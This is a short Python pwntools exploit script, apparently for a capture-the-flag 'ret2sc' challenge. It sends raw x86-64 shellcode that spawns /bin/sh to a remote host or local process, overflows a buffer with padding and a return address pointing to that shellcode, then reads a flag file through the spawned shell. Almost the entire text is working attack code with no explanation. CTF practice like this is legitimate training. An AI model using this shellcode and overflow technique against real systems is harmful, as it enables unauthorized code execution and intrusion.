#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './ret2sc'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2122

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

name_addr = 0x601080
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.send(sc)
input()
r.send(b'A'*0x28+p64(name_addr))
r.sendline('cat /home/`whoami`/flag')
r.interactive()
